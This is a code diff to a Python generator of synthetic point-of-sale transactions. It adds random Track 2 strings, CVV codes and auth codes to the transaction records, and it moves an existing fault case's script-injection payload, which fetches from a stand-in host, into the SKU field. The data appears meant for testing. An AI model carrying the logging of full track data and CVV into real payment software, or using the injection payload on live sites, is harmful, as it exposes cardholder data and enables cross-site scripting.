@@ -77,7 +77,8 @@ FIRST = ["Ana", "Ben", "Chloe", "Daan", "Eva", "Femke", "Jonas", "Lena",
          "Lucas", "Mila", "Noah", "Sanne", "Tim", "Yara", "Lars", "Emma"]
 LAST = ["Bakker", "Visser", "Schmidt", "Weber", "Jansen", "Meyer", "Smit",
         "Koch", "de Vries", "Wagner", "Mulder", "Becker", "Bos", "Hoffmann"]
-CASHIERS = ["Dana P.", "Ruben K.", "Ilse M.", "Omar S.", "Paula V.", "Kai L."]
+# Operator codes as a terminal prints them; the roster stays in the store.
+CASHIERS = ["OP03", "OP07", "OP11", "OP14", "OP19", "OP22"]
 
 
 def load_config() -> dict:
@@ -116,11 +117,17 @@ def make_shoppers(stores: list[dict], count: int, rng: random.Random) -> list[di
     shoppers = []
     for i in range(count):
         prefix, brand, length = rng.choice(brands)
+        pan = luhn_pan(prefix, length, rng)
+        expiry = f"{rng.randint(27, 31)}{rng.randint(1, 12):02d}"  # YYMM, as on track 2
+        discretionary = "".join(str(rng.randrange(10)) for _ in range(9))
         shoppers.append({
-            "pan": luhn_pan(prefix, length, rng),
+            "pan": pan,
             "brand": brand,
-            "name": f"{rng.choice(FIRST)[0]}. {rng.choice(LAST)}",
-            "expiry": f"{rng.randint(1, 12):02d}/{rng.randint(27, 31)}",
+            # Track 1 name field: SURNAME/INITIAL, upper case, no punctuation
+            "name": f"{rng.choice(LAST).upper().replace(' ', '')}/{rng.choice(FIRST)[0]}",
+            "expiry": expiry,
+            "track2": f"{pan}={expiry}101{discretionary}",
+            "cvv": f"{rng.randrange(1000):03d}",
             "home": stores[i % len(stores)]["store_id"],
             "email": f"shopper{i:04d}@example.net" if rng.random() < 0.3 else None,
             "online": rng.random() < 0.35,
@@ -225,8 +232,9 @@ class Register:
         picks = rng.choices(CATALOG, weights=weights, k=rng.choice([1, 1, 2, 2, 3, 4]))
         items: dict[str, dict] = {}
         for sku, name, category, cents, _ in picks:
-            line = items.setdefault(sku, {"sku": sku, "name": name, "category": category,
-                                          "qty": 0, "unit_cents": cents})
+            # The till knows SKUs and prices only; names and categories are
+            # looked up at the edge from the catalog.
+            line = items.setdefault(sku, {"sku": sku, "qty": 0, "unit_cents": cents})
             line["qty"] += 1
         return list(items.values())
 
@@ -245,15 +253,18 @@ class Register:
             "register_id": self.id,
             "ts": now_iso(),
             "pan": shopper["pan"],
-            "cardholder": shopper["name"],
+            "track2": shopper["track2"],
+            "cvv": shopper["cvv"],
             "expiry": shopper["expiry"],
+            "cardholder": shopper["name"],
             "card_brand": shopper["brand"],
             "entry_mode": rng.choice(["contactless", "contactless", "chip", "swipe"]),
+            "auth_code": "".join(rng.choice("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789") for _ in range(6)),
             "cashier": self.world.cashier(self.id),
             "items": items,
             "total_cents": sum(i["qty"] * i["unit_cents"] for i in items),
             "currency": self.world.currency,
-            "note": rng.choice(["", "", "", "bag", "receipt by email", "2 for 1 applied"]),
+            "note": "",
         }
         if shopper["email"]:
             rec["loyalty_email"] = shopper["email"]
@@ -275,7 +286,7 @@ class Register:
             del rec["pan"]
             rec["items"][0]["qty"] = "two"
         elif fault == "inject":
-            rec["items"][0]["name"] = "<script>fetch('//x.example/k')</script>"
+            rec["items"][0]["sku"] = "<script>fetch('//x.example/k')</script>"
             rec["sig"] = self.sign(rec)
         return rec, fault
 
@@ -699,6 +710,13 @@ def profile(args: argparse.Namespace) -> int:
     return 0
 
 
+def catalog(args: argparse.Namespace) -> int:
+    # What the edge adds to a SKU: the product's name and category.
+    print(json.dumps({sku: {"name": name, "category": category}
+                      for sku, name, category, _, _ in CATALOG}, separators=(",", ":")))
+    return 0
+
+
 def main() -> int:
     ap = argparse.ArgumentParser()
     sub = ap.add_subparsers(dest="cmd", required=True)
@@ -711,6 +729,7 @@ def main() -> int:
     k.add_argument("store")
     p = sub.add_parser("profile")
     p.add_argument("store")
+    sub.add_parser("catalog")
     sub.add_parser("list")
     args = ap.parse_args()
     if args.cmd == "serve":
@@ -719,6 +738,8 @@ def main() -> int:
         return keys(args)
     if args.cmd == "profile":
         return profile(args)
+    if args.cmd == "catalog":
+        return catalog(args)
     for store in load_config()["stores"]:
         print(store["store_id"])
     return 0
